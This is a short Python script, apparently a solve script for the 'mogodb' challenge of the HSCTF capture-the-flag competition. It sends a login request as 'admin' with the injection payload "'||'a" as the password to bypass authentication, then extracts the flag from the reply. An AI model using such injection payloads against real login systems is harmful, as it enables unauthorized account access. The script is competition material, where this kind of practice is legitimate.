import requests
import requests
import re

#URL = "http://localhost:1337"
URL = "http://mogodb.hsctf.com"
resp = requests.post(URL, data={"user": "admin", "password": "'||'a"})
print(re.search(r"flag{.*?}", resp.text).group(0))